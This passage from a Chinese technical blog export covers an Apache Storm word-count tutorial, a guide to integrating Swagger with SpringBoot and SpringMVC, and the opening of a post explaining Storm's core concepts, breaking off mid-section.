class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">nextTuple</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(completed)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Thread.sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//Do nothing</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String str;</span><br><span class=\"line\">        <span class=\"type\">BufferedReader</span> <span class=\"variable\">reader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BufferedReader</span>(fileReader);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span>((str = reader.readLine()) != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                <span class=\"built_in\">this</span>.collector.emit(<span class=\"keyword\">new</span> <span class=\"title class_\">Values</span>(str));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(<span class=\"string\">&quot;Error reading tuple&quot;</span>,e);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">finally</span>&#123;</span><br><span class=\"line\">            completed = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">declareOutputFields</span><span class=\"params\">(OutputFieldsDeclarer declarer)</span> &#123;</span><br><span class=\"line\">        declarer.declare(<span class=\"keyword\">new</span> <span class=\"title class_\">Fields</span>(<span class=\"string\">&quot;sentence&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分割句子<br>WordSplitSentenceBolt.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">WordSplitSentenceBolt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseBasicBolt</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">(Tuple input, BasicOutputCollector collector)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">sentence</span> <span class=\"operator\">=</span> input.getString(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (String word : sentence.split(<span class=\"string\">&quot; &quot;</span>)) &#123;</span><br><span class=\"line\">            word = word.trim();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!word.isEmpty()) &#123;</span><br><span class=\"line\">                collector.emit(<span class=\"keyword\">new</span> <span class=\"title class_\">Values</span>(word));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">declareOutputFields</span><span class=\"params\">(OutputFieldsDeclarer declarer)</span> &#123;</span><br><span class=\"line\">        declarer.declare(<span class=\"keyword\">new</span> <span class=\"title class_\">Fields</span>(<span class=\"string\">&quot;word&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>统计单词数量<br>WordCountBolt.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">WordCountBolt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseBasicBolt</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"type\">Logger</span> <span class=\"variable\">logger</span> <span class=\"operator\">=</span> LoggerFactory.getLogger(WordCountBolt.class);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Map&lt;String, Integer&gt;counts = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">cleanup</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        counts.forEach((key, value) -&gt; &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;```````````````````````````````````````&quot;</span>);</span><br><span class=\"line\">            logger.error(<span class=\"string\">&quot;&#123;&#125;: &#123;&#125;&quot;</span>, key, value);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">execute</span><span class=\"params\">(Tuple input, BasicOutputCollector collector)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">word</span> <span class=\"operator\">=</span> input.getString(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> counts.get(word);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (count == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            count = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        count++;</span><br><span class=\"line\">        counts.put(word, count);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">declareOutputFields</span><span class=\"params\">(OutputFieldsDeclarer declarer)</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其他例子可参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdG9ybS90cmVlL21hc3Rlci9leGFtcGxlcw==\">Storm官方例子<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"向集群提交任务\"><a href=\"#向集群提交任务\" class=\"headerlink\" title=\"向集群提交任务\"></a>向集群提交任务</h3><p>把项目打成jar包，在storm安装主目录下执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">bin/./storm jar demo.jar com.whh.WordCountTopology</span><br></pre></td></tr></table></figure>\n<p>如果需要停止Topology，在storm目录下执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">bin/./storm <span class=\"built_in\">kill</span> &#123;toponmae&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>其中{toponmae}是Topology提交到Storm集群时指定的Topology任务名称</p>\n</blockquote>\n","categories":["Storm学习"],"tags":["Storm","Storm安装","Storm本地调用"]},{"title":"SpringBoot集成swagger","url":"/2017/08/09/SpringBoot%E9%9B%86%E6%88%90swagger/","content":"<blockquote>\n<p>Swagger 是一款RESTFUL接口的文档在线自动生成+功能测试功能软件。参考 <em><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zd2FnZ2VyLmlvLw==\">官方地址<i class=\"fa fa-external-link-alt\"></i></span></em></p>\n</blockquote>\n<h3 id=\"在SpringBoot中集成swagger\"><a href=\"#在SpringBoot中集成swagger\" class=\"headerlink\" title=\"在SpringBoot中集成swagger\"></a>在SpringBoot中集成swagger</h3><h4 id=\"创建maven项目，pom-xml添加依赖\"><a href=\"#创建maven项目，pom-xml添加依赖\" class=\"headerlink\" title=\"创建maven项目，pom.xml添加依赖\"></a>创建maven项目，pom.xml添加依赖</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.5.4.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.springfox<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>springfox-swagger2<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>compile<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h4 id=\"添加启动，以及配置\"><a href=\"#添加启动，以及配置\" class=\"headerlink\" title=\"添加启动，以及配置\"></a>添加启动，以及配置</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//启动类SpringBootMain</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SpringBootMain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        SpringApplication.run(SpringBootMainConfig.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//spring 配置SpringBootMainConfig</span></span><br><span class=\"line\"><span class=\"meta\">@ComponentScan(&quot;com.whh&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@EnableAutoConfiguration</span></span><br><span class=\"line\"><span class=\"meta\">@EnableAsync</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SpringBootMainConfig</span> &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Swagger配置</span></span><br><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"meta\">@EnableSwagger2</span></span><br><span class=\"line\"><span class=\"comment\">//控制不同环境执行该配置</span></span><br><span class=\"line\"><span class=\"meta\">@Profile(value = &#123;&quot;dev&quot;, &quot;beta&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SwaggerConfig</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Docket <span class=\"title function_\">api</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class=\"line\">                .select()</span><br><span class=\"line\">                .apis(RequestHandlerSelectors.basePackage(<span class=\"string\">&quot;com.whh&quot;</span>))</span><br><span class=\"line\">                .paths(PathSelectors.any())</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//api controller</span></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;demoApi&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@Api(value = &quot;测试接口&quot;, description = &quot;这个是测试用的接口&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoApiController</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Map&lt;String, String&gt; data = <span class=\"keyword\">new</span> <span class=\"title class_\">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        data.put(<span class=\"string\">&quot;111&quot;</span>, <span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        data.put(<span class=\"string\">&quot;222&quot;</span>, <span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        data.put(<span class=\"string\">&quot;333&quot;</span>, <span class=\"string\">&quot;ccc&quot;</span>);</span><br><span class=\"line\">        data.put(<span class=\"string\">&quot;444&quot;</span>, <span class=\"string\">&quot;ddd&quot;</span>);</span><br><span class=\"line\">        data.put(<span class=\"string\">&quot;555&quot;</span>, <span class=\"string\">&quot;eee&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@ApiOperation(value = &quot;所有数据&quot;, response = Map.class)</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/allData&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Map&lt;String, String&gt; <span class=\"title function_\">allData</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@ApiOperation(value = &quot;展示数据&quot;, response = String.class)</span></span><br><span class=\"line\">    <span class=\"meta\">@ApiResponses(value = &#123;</span></span><br><span class=\"line\"><span class=\"meta\">            @ApiResponse(code = 200, message = &quot;数据正常&quot;),</span></span><br><span class=\"line\"><span class=\"meta\">            @ApiResponse(code = 404, message = &quot;页面找不到&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;)</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/show/&#123;key&#125;&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">value</span><span class=\"params\">(<span class=\"meta\">@PathVariable</span> String key)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> data.get(key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/add&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ResponseEntity&lt;String&gt; <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String key, <span class=\"meta\">@RequestParam</span> String value)</span>&#123;</span><br><span class=\"line\">        data.put(key, value);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseEntity</span>&lt;&gt;(<span class=\"string\">&quot;Add OK&quot;</span>, HttpStatus.OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/update/&#123;key&#125;&quot;, method = RequestMethod.POST)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ResponseEntity&lt;String&gt; <span class=\"title function_\">update</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String value, <span class=\"meta\">@PathVariable</span> String key)</span>&#123;</span><br><span class=\"line\">        data.put(key, value);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseEntity</span>&lt;&gt;(<span class=\"string\">&quot;Update OK&quot;</span>, HttpStatus.OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/remove/&#123;key&#125;&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ResponseEntity&lt;String&gt; <span class=\"title function_\">remove</span><span class=\"params\">(<span class=\"meta\">@PathVariable</span> String key)</span>&#123;</span><br><span class=\"line\">        data.remove(key);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ResponseEntity</span>&lt;&gt;(<span class=\"string\">&quot;Remove&quot;</span>, HttpStatus.OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"添加swaggerUI\"><a href=\"#添加swaggerUI\" class=\"headerlink\" title=\"添加swaggerUI\"></a>添加swaggerUI</h4><p>下载swaggerUI，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3YWdnZXItYXBpL3N3YWdnZXItdWk=\">github swagger-ui官方地址<i class=\"fa fa-external-link-alt\"></i></span>，把文件夹dist 放入springboot项目resource&#x2F;statis下。改名为swagger-ui。修改文件index.html js中SwaggerUIBundle的url为<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo3MDcwL3YyL2FwaS1kb2NzJUUzJTgwJTgy\">http://localhost:7070/v2/api-docs。<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h4 id=\"添加springboot配置文件\"><a href=\"#添加springboot配置文件\" class=\"headerlink\" title=\"添加springboot配置文件\"></a>添加springboot配置文件</h4><p>在resource下添加目录coufig，添加文件application.properties</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#配置文件环境</span><br><span class=\"line\">spring.profiles.active=dev</span><br><span class=\"line\">#server 启动端口</span><br><span class=\"line\">server.port=7070</span><br><span class=\"line\">#thymeleaf 模板缓存</span><br><span class=\"line\">spring.thymeleaf.cache=false</span><br><span class=\"line\">#spring.mvc 配置静态文件为准</span><br><span class=\"line\">spring.mvc.static-path-pattern=/static/**</span><br></pre></td></tr></table></figure>\n\n<p>启动main方法，访问地址<span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdDo3MDcwL3N0YXRpYy9zd2FnZ2VyLXVpL2luZGV4Lmh0bWw=\">http://localhost:7070/static/swagger-ui/index.html<i class=\"fa fa-external-link-alt\"></i></span> ，大功告成</p>\n<blockquote>\n<p>如果需要直接通过配置文件。直接生产restful风格代码，可以使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lZGl0b3Iuc3dhZ2dlci5pby8=\">swagger edit<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n</blockquote>\n<h3 id=\"传统SpringMVC添加swagger\"><a href=\"#传统SpringMVC添加swagger\" class=\"headerlink\" title=\"传统SpringMVC添加swagger\"></a>传统SpringMVC添加swagger</h3><h4 id=\"添加pom依赖\"><a href=\"#添加pom依赖\" class=\"headerlink\" title=\"添加pom依赖\"></a>添加pom依赖</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.springfox<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>springfox-swagger2<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>compile<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"添加swagger配置文件\"><a href=\"#添加swagger配置文件\" class=\"headerlink\" title=\"添加swagger配置文件\"></a>添加swagger配置文件</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"meta\">@EnableSwagger2</span></span><br><span class=\"line\"><span class=\"meta\">@EnableWebMvc</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SwaggerConfig</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Bean</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Docket <span class=\"title function_\">api</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class=\"line\">                .select()</span><br><span class=\"line\">                .apis(RequestHandlerSelectors.basePackage(<span class=\"string\">&quot;com.whh&quot;</span>))</span><br><span class=\"line\">                .paths(PathSelectors.any())</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果确实jackson类，需要添加jackson依赖</p>\n</blockquote>\n<p>后续操作和SpringBoot一样，添加ui和配置js地址等。</p>\n","categories":["SpringBoot"],"tags":["SpringBoot","swagger"]},{"title":"Storm学习（三）：Storm概念","url":"/2017/08/10/Storm%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AStorm%E6%A6%82%E5%BF%B5/","content":"<p>对于Storm，其核心概念有包括：</p>\n<blockquote>\n<ul>\n<li>Stream 数据流</li>\n<li>Spout 数据流</li>\n<li>Bolt 处理数据</li>\n<li>Tuple 数据单元</li>\n<li>Task 运行Spout或Bolt中的线程</li>\n<li>Worker 是运行这些线程中的进程</li>\n<li>Stream Grouping 规定了Bolt接受何种数据类型作为输入</li>\n<li>Topology 是Stream Grouping连接起来的Spout和Bolt节点网络</li>\n</ul>\n</blockquote>\n<h3 id=\"Tuple元组\"><a href=\"#Tuple元组\" class=\"headerlink\" title=\"Tuple元组\"></a>Tuple元组</h3><blockquote>\n<p>Tuple 是Storm中使用的最基本单元、数据模型和元组。Tuple就是一个值列表，Tuple默认值类型有：integer、float、double、long、short、string、byte、binary[byte[]]。如果需要使用其他类型，需要序列化该类型。</p>\n</blockquote>\n<span id=\"more\"></span>\n<p>Tuple可以理解为键值对，键为declareOutputFields中的Fields，值为emit发送的Values。<br>Tuple由Spout中的nextTuple来获取下一个Tuple，通过emit将生成的Tuple发送出去。</p>\n<h3 id=\"Spout数据源\"><a href=\"#Spout数据源\" class=\"headerlink\" title=\"Spout数据源\"></a>Spout数据源</h3><p>Spout最源头的接口为IComponent，由Spout发出的Tuple，可以是可靠的，可以是不可靠的。可靠的Tuple会保证被Storm成功处理。处理失败后会重新发送。一个Spout可以发射多个流。在使用Spout时可以实现IRichSpout或者继承BaseRichSpout。<br>在Spout.declareOutputFields声明发送的Tuple包含的字段。</p>\n<h3 id=\"Bolt\"><a href=\"#Bolt\" class=\"headerlink\" title=\"Bolt\"></a>Bolt</h3><p>Bolt属于被动处理，元组输入Bolt，然后产生新的Tuple。<br>Bolt流程如下：<br>创建Bolt -&gt; 序列化Bolt -&gt; 提交集群开启Worker进程处理 -&gt; 反序列化Bolt -&gt; 调用prepare处理Tuple</p>\n<p>在Bolt处理完成后，如果Tuple是可靠的，需要调用ack，反馈调用成功。在使用IBasicBolt时，会自动调用ack，在BasicBoltExecutor.execute中可以看到调用完成后会调用ack。</p>\n<p>在使用Bolt中，常用类为BaseRichBolt、BaseBasicBolt，对于BaseBasicBolt继承IBasicBolt，同样处理完成后会自动调ack。BaseRichBot在处理完成后，如果Tuple是可靠的，需要手动调用ack。在可靠Tuple中，如果不是调用ack，因为Storm会一直追踪每个Tuple，需要中内存，长时间运行会导致OOM。</p>\n<p>在方法declareOutputFields中声明当前Bolt发送的字段。同样使用declareStream方法来定义流，之后使用emit选择需要发送的流。</p>\n<p>在Bolt使用emit时，可以通过传递参数streamId，来控制新的Tuple是否后旧的Tuple属于同一颗Tuple树。</p>\n<h3 id=\"Topology\"><a href=\"#Topology\" class=\"headerlink\" title=\"Topology\"></a>Topology</h3><p>在Storm中Topology是指类似于网络拓扑图的一种虚拟结构。一个拓扑图有Spout和Bolt组成，Spout和Bolt之间通过流分组连接起来。在启动Topology时，TopologyBuilder实际上是封装了Topology的Thrift接口，Topology实际上是Thrift定义的一个结构，Nimbus实际上运行的是一个Thrift服务器，用于接受用户提交的结构。因为使用Thrift实现，用户可以使用其他语言建立Topology。在提交Topology给Nimbus时，也会提交Topology代码。Nimbus负责分发代码和给Topology分配工作进程.如果一个工作进程挂掉后,Nimbus节点会重新分配到其他节点。</p>\n<h4 id=\"Topology运行流程\"><a href=\"#Topology运行流程\" class=\"headerlink\" title=\"Topology运行流程\"></a>Topology运行流程</h4><p>1、提交Topology后，Storm会把代码存放发到Nimbus节点的inbox目录下；之后把当前配置生成stormconf.ser文件放到Nimbus节点的stormdis目录中，改目录中还有序列化后的Topology文件。<br>2、设定Topology关联的Spout和Bolt，可以同时随着Spout和Bolt的Executor和Task数量，一个默认Topology的Task总和与Executor一致。之后根据Worker的数量，将这些Task分配到不同的Worder上执行。<br>3、分配任务后，Nimbus节点将任务信息提交到ZooKeeper集群，同时在ZooKeeper集群中有Workerbeats，这里存储了当前Topology所有Worker心跳<br>4、Supervisor节点轮询ZooKeeper集群，在ZooKeeper中assignments中保存了所有Topology任务分配信息、代码存储目录、任务之间关联关系等，Supervisor通过轮询改节点领取自己任务，启动Worker进程运行<br>5、Topology运行后，不断通过Spout来发生流，除非手动结束Topology。</p>\n<h4 id=\"Topology方法调用流程\"><a href=\"#Topology方法调用流程\" class=\"headerlink\" title=\"Topology方法调用流程\"></a>Topology方法调用流程</h4><p>1、在Spout或者Bolt中，declareOutputFields方法和构造方法只被调用一次<br>2、open和prepare调用多次，次数由设置运行组件的Task线程数量。<br>3、nextTuple和execute一直运行。<br>4、提交Topology后，Storm创建Spout&#x2F;Bolt实例并进行序列化，之后将序列化组件发送给所有任务节点，在每个任务节点进行反序列化。<br>5、组件之间通信使用ZeroMQ</p>\n<h4 id=\"Topology执行单元概念\"><a href=\"#Topology执行单元概念\" class=\"headerlink\" title=\"Topology执行单元概念\"></a>Topology执行单元概念</h4><blockquote>\n<ul>\n<li>Worker对Topology中每个组件运行一个或者多个Executor线程来提供Task的执行服务，一个Supervisor中有多个worker，一个worker属于一个特定的Topology</li>\n<li>Executor属于Worker进程内线程</li>\n<li>Task，实际处理数据。在Topology生命周期中Task数量不会发生变化。</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>worker 在yaml中的topology.workers属性设置，或者config中setNumWorkers<br>Executor 在setBolt或者setSpout中设置<br>Task 默认和Executor一致，在TopologyBuilder.setNumTasks设置<br>停止Topology storm kill sopologyName</p>\n</blockquote>\n<h3 id=\"Stream消息流\"><a href=\"#Stream消息流\" class=\"headerlink\" title=\"Stream消息流\"></a>Stream消息流</h3><p>stream消息流是一个抽象概念，主要是消息中的Tuple。</p>\n<h3 id=\"Stream-Grouping消息流组\"><a href=\"#Stream-Grouping消息流组\" class=\"headerlink\" title=\"Stream Grouping消息流组\"></a>Stream Grouping消息流组</h3><p>Stream 